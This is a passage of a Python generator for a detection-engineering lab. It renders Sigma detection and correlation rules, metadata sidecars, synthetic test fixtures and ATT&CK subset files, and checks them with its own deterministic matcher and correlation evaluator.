    lines.extend(ylist("tags", build_tags(spec["techniques"], spec.get("extra_techniques", []))))
    lines.append("correlation:")
    lines.append(f"    type: {spec['correlation_type']}")
    lines.append("    rules:")
    for base in spec["bases"]:
        lines.append(f"        - {base['name']}")
    if spec.get("aliases"):
        lines.append("    aliases:")
        for alias, mapping in spec["aliases"].items():
            lines.append(f"        {alias}:")
            for rule_name, field_name in mapping.items():
                lines.append(f"            {rule_name}: {field_name}")
    lines.append("    group-by:")
    for key in spec["group_by"]:
        lines.append(f"        - {key}")
    lines.append(f"    timespan: {spec['timespan']}")
    if spec["correlation_type"] in {"event_count", "value_count"}:
        lines.append("    condition:")
        lines.append(f"        gte: {spec['threshold']}")
        if spec["correlation_type"] == "value_count":
            lines.append(f"        field: {spec['count_field']}")
    lines.extend(ylist_folded("falsepositives", spec["fps"]))
    lines.append(f"level: {spec['level']}")
    lines.append(f"license: {LICENSE}")
    docs.append("\n".join(lines))

    return "\n---\n".join(docs) + "\n"


# --------------------------------------------------------------------------------------
# Deterministic matcher used for self-verification
# --------------------------------------------------------------------------------------


class ConditionError(RuntimeError):
    pass


def field_value(event: dict[str, Any], name: str) -> Any:
    fields = event.get("fields", {})
    if name in fields:
        return fields[name]
    if name in event:
        return event[name]
    return None


def scalar_match(actual: Any, expected: Any, modifiers: list[str]) -> bool:
    if actual is None:
        return False
    if isinstance(actual, list):
        return any(scalar_match(item, expected, modifiers) for item in actual)
    if not modifiers and isinstance(expected, int) and not isinstance(expected, bool):
        try:
            return int(actual) == expected
        except (TypeError, ValueError):
            return False
    actual_text = str(actual)
    expected_text = str(expected)
    if "cased" not in modifiers:
        actual_text = actual_text.lower()
        expected_text = expected_text.lower()
    if "contains" in modifiers:
        return expected_text in actual_text
    if "startswith" in modifiers:
        return actual_text.startswith(expected_text)
    if "endswith" in modifiers:
        return actual_text.endswith(expected_text)
    if "re" in modifiers:
        return re.search(expected_text, actual_text) is not None
    return actual_text == expected_text


def selection_match(event: dict[str, Any], fields: list[tuple[str, Any]]) -> bool:
    for field_key, expected in fields:
        parts = field_key.split("|")
        name = parts[0]
        modifiers = parts[1:]
        actual = field_value(event, name)
        if isinstance(expected, list):
            if "all" in modifiers:
                ok = all(scalar_match(actual, item, modifiers) for item in expected)
            else:
                ok = any(scalar_match(actual, item, modifiers) for item in expected)
        else:
            ok = scalar_match(actual, expected, modifiers)
        if not ok:
            return False
    return True


def tokenize(condition: str) -> list[str]:
    return re.findall(r"\(|\)|\band\b|\bor\b|\bnot\b|[A-Za-z0-9_*]+", condition)


def eval_condition(condition: str, results: dict[str, bool]) -> bool:
    tokens = tokenize(condition)
    position = 0

    def peek() -> str | None:
        return tokens[position] if position < len(tokens) else None

    def consume() -> str:
        nonlocal position
        token = tokens[position]
        position += 1
        return token

    def parse_primary() -> bool:
        token = peek()
        if token is None:
            raise ConditionError(f"unexpected end of condition: {condition}")
        if token == "(":
            consume()
            value = parse_or()
            if peek() != ")":
                raise ConditionError(f"missing closing parenthesis: {condition}")
            consume()
            return value
        if token == "not":
            consume()
            return not parse_primary()
        name = consume()
        if name not in results:
            raise ConditionError(f"unknown selection '{name}' in condition: {condition}")
        return results[name]

    def parse_and() -> bool:
        value = parse_primary()
        while peek() == "and":
            consume()
            value = parse_primary() and value
        return value

    def parse_or() -> bool:
        value = parse_and()
        while peek() == "or":
            consume()
            value = parse_and() or value
        return value

    result = parse_or()
    if position != len(tokens):
        raise ConditionError(f"trailing tokens in condition: {condition}")
    return result


def expected_detection(detection: list[tuple[str, Any]], condition: str) -> dict[str, Any]:
    block: dict[str, Any] = {}
    for name, fields in detection:
        block[name] = {key: value for key, value in fields}
    block["condition"] = condition
    return block


def check_yaml_roundtrip(label: str, text: str, blocks: list[dict[str, Any]]) -> list[str]:
    """Confirm the emitted YAML loads back into exactly the intended detection blocks."""
    problems: list[str] = []
    docs = [doc for doc in yaml.safe_load_all(text) if doc]
    loaded = [doc["detection"] for doc in docs if "detection" in doc]
    if len(loaded) != len(blocks):
        return [f"{label}: expected {len(blocks)} detection blocks, loaded {len(loaded)}"]
    for index, (actual, wanted) in enumerate(zip(loaded, blocks)):
        if actual != wanted:
            problems.append(
                f"{label}: detection block {index} changed on YAML round trip; "
                f"loaded {actual!r} instead of {wanted!r}"
            )
    return problems


def rule_matches(event: dict[str, Any], detection: list[tuple[str, Any]], condition: str) -> bool:
    results = {name: selection_match(event, fields) for name, fields in detection}
    return eval_condition(condition, results)


# --------------------------------------------------------------------------------------
# Event construction
# --------------------------------------------------------------------------------------


def timestamp(offset_seconds: int) -> str:
    return (BASE_TIME + timedelta(seconds=offset_seconds)).strftime("%Y-%m-%dT%H:%M:%SZ")


def build_event(
    profile_name: str,
    event_id: str,
    offset_seconds: int,
    overrides: dict[str, Any],
    scenario: str,
    notes: str,
) -> dict[str, Any]:
    profile = PROFILES[profile_name]
    fields = dict(profile["base"])
    fields.update(overrides)
    host = fields.get("Computer", profile["host"])
    user = fields.get("User") or fields.get("SubjectUserName") or profile["user"]
    return {
        "schema_version": FIXTURE_SCHEMA_VERSION,
        "event_id": event_id,
        "timestamp_utc": timestamp(offset_seconds),
        "synthetic": True,
        "platform": profile["platform"],
        "logsource": dict(profile["logsource"]),
        "channel": fields.get("Channel", profile["channel"]),
        "provider": fields.get("Provider_Name", profile["provider"]),
        "host": host,
        "user": user,
        "fields": fields,
        "scenario": scenario,
        "notes": notes,
    }


# --------------------------------------------------------------------------------------
# Sidecar construction
# --------------------------------------------------------------------------------------

FIELD_SEMANTICS: dict[str, str] = {
    "Image": "Absolute path of the executable backing the created process.",
    "OriginalFileName": "Original file name recorded in the binary version resource.",
    "CommandLine": "Full command line including arguments as supplied to the process.",
    "ParentImage": "Absolute path of the executable that created the process.",
    "ParentCommandLine": "Command line of the creating process.",
    "CurrentDirectory": "Working directory of the created process.",
    "User": "Account context in which the event was produced.",
    "Computer": "Host on which the event was produced.",
    "Channel": "Windows event log channel that carried the record.",
    "EventID": "Numeric identifier of the Windows event record.",
    "Provider_Name": "Name of the event provider that raised the record.",
    "TargetObject": "Full registry path of the value that was written.",
    "Details": "Rendered data written to the registry value.",
    "EventType": "Sub-type of the telemetry record, such as SetValue or WmiBindingEvent.",
    "TargetFilename": "Absolute path of the file that was created or modified.",
    "SourceImage": "Absolute path of the process requesting access.",
    "TargetImage": "Absolute path of the process being accessed.",
    "GrantedAccess": "Hexadecimal access mask granted for the process handle.",
    "CallTrace": "Call stack recorded for the access request where available.",
    "Operation": "Lifecycle operation applied to the subscription component.",
    "Name": "Name of the subscription component.",
    "Query": "Query text associated with the event filter.",
    "Consumer": "Name of the subscription consumer.",
    "Filter": "Name of the subscription filter.",
    "ServiceName": "Name of the service registered with the service control manager.",
    "ImagePath": "Executable path configured for the service, including arguments.",
    "ServiceType": "Service type reported at installation time.",
    "StartType": "Configured start type of the service.",
    "AccountName": "Account under which the service is configured to run.",
    "ScriptBlockText": "Decoded PowerShell script block text as executed.",
    "ScriptBlockId": "Identifier grouping the parts of a single script block.",
    "Path": "Script file path when the script block originates from a file.",
    "SubjectUserName": "Account that performed the audited action.",
    "SubjectDomainName": "Domain of the account that performed the audited action.",
    "TargetUserName": "Account or group that was the object of the audited action.",
    "TargetDomainName": "Domain of the object of the audited action.",
    "MemberName": "Distinguished name or account name of the affected group member.",
    "IpAddress": "Network address associated with the authentication attempt.",
    "TaskName": "Full path of the scheduled task in the task library.",
    "TaskContent": "Serialised task definition including trigger and action elements.",
    "ObjectDN": "Distinguished name of the directory object involved in the operation.",
    "AttributeLDAPDisplayName": "Directory attribute affected by the change.",
    "AttributeValue": "Value written to the directory attribute.",
    "OperationType": "Type of directory modification, such as value added or deleted.",
    "Properties": "Directory attributes or property sets touched by the access request.",
    "AuditPolicyChanges": "Description of the audit subcategory settings that changed.",
    "CategoryId": "Audit policy category affected by the change.",
    "SubcategoryId": "Audit policy subcategory affected by the change.",
    "ProcessName": "Program name recorded by the system logger.",
    "Message": "Free-text message body recorded by the system logger.",
    "SourceIp": "Network address of the remote authentication client.",
    "Mode": "File permission mode recorded for the affected path.",
}


def detection_fields(detection: list[tuple[str, Any]]) -> list[str]:
    names: list[str] = []
    for _, fields in detection:
        for field_key, _ in fields:
            name = field_key.split("|")[0]
            if name not in names:
                names.append(name)
    return names


def defensive_mapping(techniques: list[str]) -> tuple[list[dict], list[dict], list[dict], str]:
    strategies: list[dict] = []
    analytics: list[dict] = []
    components: list[dict] = []
    unmapped: list[str] = []
    for tid in techniques:
        entry = DEFENSIVE.get(tid)
        if not entry:
            unmapped.append(tid)
            continue
        strategies.append({"id": entry["det"], "technique_id": tid})
        analytics.append({"id": entry["an"], "technique_id": tid})
        for dc_id in entry["dc"]:
            components.append({"id": dc_id, "technique_id": tid})
    reason = ""
    if unmapped:
        reason = f"{UNMAPPED_REASON} Unmapped techniques: {', '.join(unmapped)}."
    return strategies, analytics, components, reason


def build_sidecar(spec: dict[str, Any], is_correlation: bool) -> dict[str, Any]:
    if is_correlation:
        profile = PROFILES[spec["bases"][0]["profile"]]
        alias_map = spec.get("aliases") or {}
        alias_fields = {
            mapped for mapping in alias_map.values() for mapped in mapping.values()
        }
        required_fields = sorted(
            (
                {name for base in spec["bases"] for name in detection_fields(base["detection"])}
                | set(spec["group_by"])
                | alias_fields
            )
            - set(alias_map)
        )
        rule_family = "correlation"
        platform = "multi"
        required_logs = sorted(
            {log for base in spec["bases"] for log in PROFILES[base["profile"]]["required_logs"]}
        )
        required_channels = sorted(
            {ch for base in spec["bases"] for ch in PROFILES[base["profile"]]["channels"]}
        )
        optional_fields = sorted(
            {f for base in spec["bases"] for f in PROFILES[base["profile"]]["optional_fields"]}
        )
        collection_prerequisites = sorted(
            {
                item
                for base in spec["bases"]
                for item in PROFILES[base["profile"]]["collection_prerequisites"]
            }
        )
        gaps = sorted(
            {
                item
                for base in spec["bases"]
                for item in PROFILES[base["profile"]]["expected_collection_gaps"]
            }
        )
        normalization = sorted(
            {
                item
                for base in spec["bases"]
                for item in PROFILES[base["profile"]]["normalization_assumptions"]
            }
        )
        ingestion = sorted(
            {
                item
                for base in spec["bases"]
                for item in PROFILES[base["profile"]]["ingestion_differences"]
            }
        )
        retention = " ".join(
            sorted({PROFILES[base["profile"]]["retention"] for base in spec["bases"]})
        )
        minimum_positive = 2
        minimum_negative = 2
        supported_backends: list[str] = []
        unsupported = {
            "splunk": (
                "Correlation rule conversion is out of scope for version 1.0 of this lab; the "
                "rule is validated by the local correlation evaluator only."
            ),
            "elasticsearch-lucene": (
                "Correlation rule conversion is out of scope for version 1.0 of this lab; the "
                "rule is validated by the local correlation evaluator only."
            ),
        }
    else:
        profile = PROFILES[spec["profile"]]
        required_fields = detection_fields(spec["detection"])
        rule_family = spec["family"]
        platform = profile["platform"]
        required_logs = list(profile["required_logs"])
        required_channels = list(profile["channels"])
        optional_fields = list(profile["optional_fields"])
        collection_prerequisites = list(profile["collection_prerequisites"])
        gaps = list(profile["expected_collection_gaps"])
        normalization = list(profile["normalization_assumptions"])
        ingestion = list(profile["ingestion_differences"])
        retention = profile["retention"]
        minimum_positive = 2
        minimum_negative = 3
        supported_backends = ["splunk", "elasticsearch-lucene"]
        unsupported = {}

    techniques = spec["techniques"] + spec.get("extra_techniques", [])
    strategies, analytics, components, unmapped_reason = defensive_mapping(techniques)
    tactic_ids: list[str] = []
    for tid in techniques:
        for tactic_id in TECHNIQUES[tid][1]:
            if tactic_id not in tactic_ids:
                tactic_ids.append(tactic_id)

    return {
        "schema_version": SIDECAR_SCHEMA_VERSION,
        "catalog_id": spec["cid"],
        "sigma_rule_id": rule_uuid(spec["cid"]),
        "title": spec["title"],
        "detection_hypothesis": spec["hypothesis"],
        "platform": platform,
        "rule_family": rule_family,
        "maturity": "tested-synthetic",
        "required_logs": required_logs,
        "required_channels": required_channels,
        "required_fields": required_fields,
        "optional_fields": optional_fields,
        "field_semantics": {
            name: FIELD_SEMANTICS.get(name, "Field used by this rule; see the telemetry catalog.")
            for name in required_fields
        },
        "collection_prerequisites": collection_prerequisites,
        "expected_collection_gaps": gaps,
        "normalization_assumptions": normalization,
        "ingestion_differences": ingestion,
        "retention_considerations": retention,
        "expected_volume": spec["volume"],
        "false_positive_strategy": spec["fp_strategy"],
        "tuning_guidance": spec["tuning"],
        "test_strategy": spec["test_strategy"],
        "minimum_positive_tests": minimum_positive,
        "minimum_negative_tests": minimum_negative,
        "attack_techniques": [
            {"id": tid, "name": TECHNIQUES[tid][0]} for tid in techniques
        ],
        "attack_tactics": [
            {"id": tactic_id, "name": TACTICS[tactic_id][0]} for tactic_id in tactic_ids
        ],
        "attack_detection_strategies": strategies,
        "attack_analytics": analytics,
        "attack_data_components": components,
        "unmapped_defensive_objects_reason": unmapped_reason,
        "attack_version": ATTACK_VERSION,
        "supported_backends": supported_backends,
        "unsupported_backend_reasons": unsupported,
        "related_rules": spec.get("related", []),
        "author": AUTHOR,
        "license": LICENSE,
        "created_at": CREATED_AT,
        "modified_at": MODIFIED_AT,
        "version": RULE_VERSION,
        "synthetic_fixtures_only": True,
    }


# --------------------------------------------------------------------------------------
# Writers
# --------------------------------------------------------------------------------------


def write_text(path: Path, text: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8", newline="\n")


def write_json(path: Path, payload: Any) -> None:
    write_text(path, json.dumps(payload, indent=2, ensure_ascii=False) + "\n")


def write_jsonl(path: Path, events: list[dict[str, Any]]) -> None:
    body = "\n".join(json.dumps(event, ensure_ascii=False) for event in events)
    write_text(path, body + "\n")


def slug(text: str) -> str:
    return re.sub(r"[^a-z0-9]+", "_", text.lower()).strip("_")


# --------------------------------------------------------------------------------------
# Correlation evaluation for self-verification
# --------------------------------------------------------------------------------------


def parse_timespan(value: str) -> int:
    unit = value[-1]
    amount = int(value[:-1])
    factors = {"s": 1, "m": 60, "h": 3600, "d": 86400}
    return amount * factors[unit]


def correlation_matches(spec: dict[str, Any], events: list[dict[str, Any]]) -> bool:
    window = parse_timespan(spec["timespan"])
    aliases = spec.get("aliases") or {}

    def group_key(base_name: str, event: dict[str, Any]) -> tuple | None:
        key: list[Any] = []
        for name in spec["group_by"]:
            if name in aliases:
                mapped = aliases[name].get(base_name)
                if mapped is None:
                    return None
                value = field_value(event, mapped)
            else:
                value = field_value(event, name)
            if value is None:
                return None
            key.append(str(value).lower())
        return tuple(key)

    matches: list[tuple[str, int, tuple, dict[str, Any]]] = []
    for index, event in enumerate(events):
        seconds = int(
            (
                datetime.strptime(event["timestamp_utc"], "%Y-%m-%dT%H:%M:%SZ").replace(
                    tzinfo=timezone.utc
                )
                - BASE_TIME
            ).total_seconds()
        )
        for base in spec["bases"]:
            if rule_matches(event, base["detection"], base["condition"]):
                key = group_key(base["name"], event)
                if key is not None:
                    matches.append((base["name"], seconds, key, event))
        del index

    if spec["correlation_type"] == "event_count":
        by_key: dict[tuple, list[int]] = {}
        for base_name, seconds, key, _ in matches:
            by_key.setdefault(key, []).append(seconds)
            del base_name
        for times in by_key.values():
            times.sort()
            for start in times:
                count = sum(1 for value in times if start <= value <= start + window)
                if count >= spec["threshold"]:
                    return True
        return False

    if spec["correlation_type"] == "value_count":
        by_key: dict[tuple, list[tuple[int, str]]] = {}
        for base_name, seconds, key, event in matches:
            value = field_value(event, spec["count_field"])
            if value is None:
                continue
            by_key.setdefault(key, []).append((seconds, str(value).lower()))
            del base_name
        for entries in by_key.values():
            entries.sort()
            for start, _ in entries:
                distinct = {
                    value for seconds, value in entries if start <= seconds <= start + window
                }
                if len(distinct) >= spec["threshold"]:
                    return True
        return False

    if spec["correlation_type"] == "temporal_ordered":
        order = [base["name"] for base in spec["bases"]]
        by_key: dict[tuple, list[tuple[int, str]]] = {}
        for base_name, seconds, key, _ in matches:
            by_key.setdefault(key, []).append((seconds, base_name))
        for entries in by_key.values():
            entries.sort()
            for start_index in range(len(entries)):
                start_time = entries[start_index][0]
                stage = 0
                for seconds, base_name in entries[start_index:]:
                    if seconds - start_time > window:
                        break
                    if base_name == order[stage]:
                        stage += 1
                        if stage == len(order):
                            return True
                if stage == len(order):
                    return True
        return False

    raise RuntimeError(f"unsupported correlation type: {spec['correlation_type']}")


# --------------------------------------------------------------------------------------
# Generation
# --------------------------------------------------------------------------------------


def clean_generated_directories() -> None:
    for relative in ("rules", "metadata/rules", "fixtures/rules", "fixtures/correlation"):
        target = ROOT / relative
        if target.exists():
            shutil.rmtree(target)


def generate_standard_rules() -> tuple[int, int, int, int, list[str]]:
    errors: list[str] = []
    rule_files = 0
    sidecars = 0
    positives = 0
    negatives = 0

    for spec in RULES:
        rule_path = ROOT / "rules" / spec["path"] / spec["file"]
        rendered = render_rule_yaml(spec)
        write_text(rule_path, rendered)
        errors.extend(
            check_yaml_roundtrip(
                spec["cid"], rendered, [expected_detection(spec["detection"], spec["condition"])]
            )
        )
        rule_files += 1

        sidecar = build_sidecar(spec, is_correlation=False)
        sidecar["rule_file"] = f"rules/{spec['path']}/{spec['file']}"
        sidecar["fixture_directory"] = f"fixtures/rules/{spec['cid']}"
        write_json(ROOT / "metadata" / "rules" / f"{spec['cid']}.json", sidecar)
        sidecars += 1

        fixture_root = ROOT / "fixtures" / "rules" / spec["cid"]
        positive_cases = []
        negative_cases = []

        for index, item in enumerate(spec["pos"], start=1):
            event = build_event(
                spec["profile"],
                f"{spec['cid']}-POS-{index:02d}",
                index * 60,
                item["fields"],
                item["scenario"],
                item["notes"],
            )
            if not rule_matches(event, spec["detection"], spec["condition"]):
                errors.append(f"{spec['cid']} positive case '{item['name']}' does not match")
            filename = f"case_{index:02d}_{slug(item['name'])}.jsonl"
            write_jsonl(fixture_root / "positive" / filename, [event])
            positive_cases.append(
                {
                    "name": item["name"],
                    "file": f"positive/{filename}",
                    "expected": "match",
                    "scenario": item["scenario"],
                    "rationale": item["notes"],
                }
            )
            positives += 1

        for index, item in enumerate(spec["neg"], start=1):
            event = build_event(
                spec["profile"],
                f"{spec['cid']}-NEG-{index:02d}",
                1800 + index * 60,
                item["fields"],
                item["scenario"],
                item["notes"],
            )
            if rule_matches(event, spec["detection"], spec["condition"]):
                errors.append(f"{spec['cid']} negative case '{item['name']}' unexpectedly matches")
            filename = f"case_{index:02d}_{slug(item['name'])}.jsonl"
            write_jsonl(fixture_root / "negative" / filename, [event])
            negative_cases.append(
                {
                    "name": item["name"],
                    "file": f"negative/{filename}",
                    "expected": "no_match",
                    "scenario": item["scenario"],
                    "rationale": item["notes"],
                }
            )
            negatives += 1

        if len(positive_cases) < 2:
            errors.append(f"{spec['cid']} has fewer than two positive cases")
        if len(negative_cases) < 3:
            errors.append(f"{spec['cid']} has fewer than three negative cases")

        manifest = {
            "schema_version": FIXTURE_SCHEMA_VERSION,
            "catalog_id": spec["cid"],
            "sigma_rule_id": rule_uuid(spec["cid"]),
            "rule_file": f"rules/{spec['path']}/{spec['file']}",
            "rule_type": "standard",
            "synthetic": True,
            "platform": PROFILES[spec["profile"]]["platform"],
            "logsource": dict(PROFILES[spec["profile"]]["logsource"]),
            "channels": list(PROFILES[spec["profile"]]["channels"]),
            "minimum_positive_cases": 2,
            "minimum_negative_cases": 3,
            "positive_cases": positive_cases,
            "negative_cases": negative_cases,
            "generated_by": "tools/generate_all_rules.py",
            "notes": (
                "All events are synthetic. Negative cases are deliberate near misses that "
                "exercise one failing selection each."
            ),
        }
        write_json(fixture_root / "manifest.json", manifest)

    return rule_files, sidecars, positives, negatives, errors


def generate_correlation_rules() -> tuple[int, int, int, int, list[str]]:
    errors: list[str] = []
    rule_files = 0
    sidecars = 0
    positives = 0
    negatives = 0

    for spec in CORRELATIONS:
        rule_path = ROOT / "rules" / spec["path"] / spec["file"]
        rendered = render_correlation_yaml(spec)
        write_text(rule_path, rendered)
        errors.extend(
            check_yaml_roundtrip(
                spec["cid"],
                rendered,
                [
                    expected_detection(base["detection"], base["condition"])
                    for base in spec["bases"]
                ],
            )
        )
        rule_files += 1

        sidecar = build_sidecar(spec, is_correlation=True)
        sidecar["rule_file"] = f"rules/{spec['path']}/{spec['file']}"
        sidecar["fixture_directory"] = f"fixtures/correlation/{spec['cid']}"
        sidecar["correlation"] = {
            "type": spec["correlation_type"],
            "timespan": spec["timespan"],
            "group_by": spec["group_by"],
            "base_rules": [base["name"] for base in spec["bases"]],
            "aliases": spec.get("aliases", {}),
            "threshold": spec.get("threshold"),
            "count_field": spec.get("count_field"),
            "evaluator_support": (
                "Implemented by the documented lab correlation subset; full Sigma correlation "
                "semantics are not claimed."
            ),
        }
        write_json(ROOT / "metadata" / "rules" / f"{spec['cid']}.json", sidecar)
        sidecars += 1

        fixture_root = ROOT / "fixtures" / "correlation" / spec["cid"]
        positive_sequences = []
        negative_sequences = []

        for index, item in enumerate(spec["pos"], start=1):
            events = [
                build_event(
                    entry["profile"],
                    f"{spec['cid']}-POS-{index:02d}-{position:02d}",
                    entry["offset"],
                    entry["fields"],
                    item["scenario"],
                    item["notes"],
                )
                for position, entry in enumerate(item["events"], start=1)
            ]
            if not correlation_matches(spec, events):
                errors.append(f"{spec['cid']} positive sequence '{item['name']}' does not match")
            filename = f"sequence_{index:02d}_{slug(item['name'])}.jsonl"
            write_jsonl(fixture_root / "positive" / filename, events)
            positive_sequences.append(
                {
                    "name": item["name"],
                    "file": f"positive/{filename}",
                    "expected": "match",
                    "event_count": len(events),
                    "scenario": item["scenario"],
                    "rationale": item["notes"],
                }
            )
            positives += 1

        for index, item in enumerate(spec["neg"], start=1):
            events = [
                build_event(
                    entry["profile"],
                    f"{spec['cid']}-NEG-{index:02d}-{position:02d}",
                    7200 + entry["offset"],
                    entry["fields"],
                    item["scenario"],
                    item["notes"],
                )
                for position, entry in enumerate(item["events"], start=1)
            ]
            if correlation_matches(spec, events):
                errors.append(
                    f"{spec['cid']} negative sequence '{item['name']}' unexpectedly matches"
                )
            filename = f"sequence_{index:02d}_{slug(item['name'])}.jsonl"
            write_jsonl(fixture_root / "negative" / filename, events)
            negative_sequences.append(
                {
                    "name": item["name"],
                    "file": f"negative/{filename}",
                    "expected": "no_match",
                    "event_count": len(events),
                    "scenario": item["scenario"],
                    "rationale": item["notes"],
                }
            )
            negatives += 1

        if len(positive_sequences) < 2:
            errors.append(f"{spec['cid']} has fewer than two positive sequences")
        if len(negative_sequences) < 2:
            errors.append(f"{spec['cid']} has fewer than two negative sequences")

        manifest = {
            "schema_version": FIXTURE_SCHEMA_VERSION,
            "catalog_id": spec["cid"],
            "sigma_rule_id": rule_uuid(spec["cid"]),
            "rule_file": f"rules/{spec['path']}/{spec['file']}",
            "rule_type": "correlation",
            "correlation_type": spec["correlation_type"],
            "timespan": spec["timespan"],
            "group_by": spec["group_by"],
            "synthetic": True,
            "minimum_positive_sequences": 2,
            "minimum_negative_sequences": 2,
            "positive_sequences": positive_sequences,
            "negative_sequences": negative_sequences,
            "generated_by": "tools/generate_all_rules.py",
            "notes": (
                "All sequences are synthetic and deterministic. Negative sequences break exactly "
                "one correlation requirement each: ordering, grouping, threshold, or timespan."
            ),
        }
        write_json(fixture_root / "manifest.json", manifest)

    return rule_files, sidecars, positives, negatives, errors


# --------------------------------------------------------------------------------------
# Supporting data files
# --------------------------------------------------------------------------------------


def collect_referenced_techniques() -> list[str]:
    used: list[str] = []
    for spec in RULES + CORRELATIONS:
        for tid in spec["techniques"] + spec.get("extra_techniques", []):
            if tid not in used:
                used.append(tid)
    return sorted(used)


def generate_attack_data() -> None:
    used_techniques = collect_referenced_techniques()
    used_tactics: list[str] = []
    for tid in used_techniques:
        for tactic_id in TECHNIQUES[tid][1]:
            if tactic_id not in used_tactics:
                used_tactics.append(tactic_id)
    used_tactics.sort()

    write_json(
        ROOT / "data" / "attack" / "version.json",
        {
            "schema_version": "1.0.0",
            "domain": "enterprise-attack",
            "attack_version": ATTACK_VERSION,
            "dataset_date": ATTACK_DATASET_DATE,
            "stix_source": "https://github.com/mitre-attack/attack-stix-data",
            "stix_release_identifier": f"ATT&CK-v{ATTACK_VERSION}",
            "subset_policy": (
                "Only objects referenced by this project are vendored, plus the parent tactics "
                "required to interpret them."
            ),
            "remapped_identifier_notes": [
                "Clearing Windows event logs is mapped to T1685.005, superseding the earlier "
                "T1070.001 identifier.",
                "Clearing Linux or macOS system logs is mapped to T1685.006.",
                "Defensive tool impairment is mapped to T1685.",
                "Host firewall modification is mapped to T1686.",
            ],
            "defensive_object_policy": (
                "Detection Strategy, Analytic, and Data Component identifiers are recorded only "
                "when they were present in the pinned extraction. Official object names are "
                "vendored only where the extraction supplied them; otherwise the name field is "
                "null and no name is invented."
            ),
            "legacy_data_sources": {
                "status": "deprecated",
                "usage": "Not used as a primary mapping anywhere in this project.",
            },
        },
    )

    write_json(
        ROOT / "data" / "attack" / "enterprise-attack-subset.json",
        {
            "schema_version": "1.0.0",
            "attack_version": ATTACK_VERSION,
            "domain": "enterprise-attack",
            "tactics": [
                {
                    "id": tactic_id,
                    "name": TACTICS[tactic_id][0],
                    "shortname": TACTICS[tactic_id][1],
                    "sigma_tag": f"attack.{TACTICS[tactic_id][1]}",
                    "url": f"https://attack.mitre.org/tactics/{tactic_id}/",
                }
                for tactic_id in used_tactics
            ],
            "techniques": [
                {
                    "id": tid,
                    "name": TECHNIQUES[tid][0],
                    "is_subtechnique": "." in tid,
                    "parent_technique": tid.split(".")[0] if "." in tid else None,
                    "tactics": TECHNIQUES[tid][1],
                    "sigma_tag": f"attack.{tid.lower()}",
                    "url": attack_url(tid),
                }
                for tid in used_techniques
            ],
        },
    )

    strategies = []
    analytics = []
    components: dict[str, list[str]] = {}
    for tid in used_techniques:
        entry = DEFENSIVE.get(tid)
        if not entry:
            continue
        strategies.append(
            {
                "id": entry["det"],
                "name": None,
                "name_verification": "not_vendored",
                "technique_id": tid,
                "technique_name": TECHNIQUES[tid][0],
            }
        )
        analytics.append(
            {
                "id": entry["an"],
                "name": None,
                "name_verification": "not_vendored",
                "technique_id": tid,
                "detection_strategy_id": entry["det"],
            }
        )
        for dc_id in entry["dc"]:
            components.setdefault(dc_id, []).append(tid)

    provenance = (
        "Identifiers verified against the pinned ATT&CK extraction. Official object names are "
        "not vendored offline and are therefore null rather than invented."
    )

    write_json(
        ROOT / "data" / "attack" / "detection-strategies-subset.json",
        {
            "schema_version": "1.0.0",
            "attack_version": ATTACK_VERSION,
            "provenance": provenance,
            "detection_strategies": strategies,
        },
    )
    write_json(
        ROOT / "data" / "attack" / "analytics-subset.json",
        {
            "schema_version": "1.0.0",
            "attack_version": ATTACK_VERSION,
            "provenance": provenance,
            "analytics": analytics,
        },
    )
    write_json(
        ROOT / "data" / "attack" / "data-components-subset.json",
        {
            "schema_version": "1.0.0",
            "attack_version": ATTACK_VERSION,
            "provenance": provenance,
            "legacy_data_sources_note": (
                "Legacy ATT&CK Data Sources are deprecated and are not used as primary mappings "
                "by this project."
            ),
            "data_components": [
                {
                    "id": dc_id,
                    "name": None,
                    "name_verification": "not_vendored",
                    "referenced_by_techniques": sorted(tids),
                }
                for dc_id, tids in sorted(components.items())
            ],
        },
    )


def generate_config_files() -> None:
    write_json(
        ROOT / "config" / "telemetry-catalog.json",
        {
            "schema_version": "1.0.0",
            "description": (
                "Telemetry profiles referenced by rule sidecars. Each profile documents the "
                "logsource, channels, fields, prerequisites, and known collection gaps for a "
                "family of rules."
            ),
            "synthetic_only": True,
            "profiles": {
                name: {
                    "platform": profile["platform"],
                    "logsource": profile["logsource"],
                    "required_logs": profile["required_logs"],
                    "channels": profile["channels"],
                    "providers": profile["providers"],
                    "optional_fields": profile["optional_fields"],
                    "collection_prerequisites": profile["collection_prerequisites"],
                    "expected_collection_gaps": profile["expected_collection_gaps"],
                    "normalization_assumptions": profile["normalization_assumptions"],
                    "ingestion_differences": profile["ingestion_differences"],
                    "retention_considerations": profile["retention"],
                }
                for name, profile in PROFILES.items()
            },
            "field_semantics": FIELD_SEMANTICS,
        },
    )

    categories = sorted(
        {
            profile["logsource"]["category"]
            for profile in PROFILES.values()
            if "category" in profile["logsource"]
        }
    )
    services = sorted(
        {
            profile["logsource"]["service"]
            for profile in PROFILES.values()
            if "service" in profile["logsource"]
        }
    )
    products = sorted({profile["logsource"]["product"] for profile in PROFILES.values()})

    write_json(
        ROOT / "config" / "allowed-taxonomy.json",
        {
            "schema_version": "1.0.0",
            "sigma_specification_version": "2.1.0",
            "allowed_products": products,
            "allowed_categories": categories,
            "allowed_services": services,
            "allowed_levels": ["informational", "low", "medium", "high", "critical"],
            "allowed_statuses": ["experimental", "test"],
            "blocked_statuses": ["stable", "deprecated", "unsupported"],
            "allowed_maturity": ["experimental", "tested-synthetic"],
            "allowed_tactic_tags": sorted(
                f"attack.{shortname}" for _, shortname in TACTICS.values()
            ),
            "allowed_technique_tags": sorted(
                f"attack.{tid.lower()}" for tid in collect_referenced_techniques()
            ),
            "tag_format_notes": (
                "Tactic tags use the current Sigma taxonomy form with hyphens, for example "
                "attack.defense-evasion. Technique tags use the lowercase technique identifier, "
                "for example attack.t1059.001."
            ),
            "allowed_correlation_types": [
                "event_count",
                "value_count",
                "temporal",
                "temporal_ordered",
            ],
            "allowed_field_modifiers": [
                "contains",
                "startswith",
                "endswith",
                "re",
                "cidr",
                "exists",
                "all",
                "cased",
            ],
            "condition_conventions": {
                "prefer_named_selections": True,
                "avoid_in_main_catalog": ["1 of them", "all of them"],
                "notes": (
                    "Explicit selection names keep conditions readable and keep the deterministic "
                    "lab matcher in scope."
                ),
            },
        },
    )


METADATA_README = """# Rule Metadata Sidecars

Every rule in `rules/` has exactly one detection metadata sidecar in this directory, named
after its stable project catalog identifier, for example `SDEL-WIN-001.json`.

## Why sidecars exist

The Sigma rule itself stays portable and specification-compliant. Everything that is useful
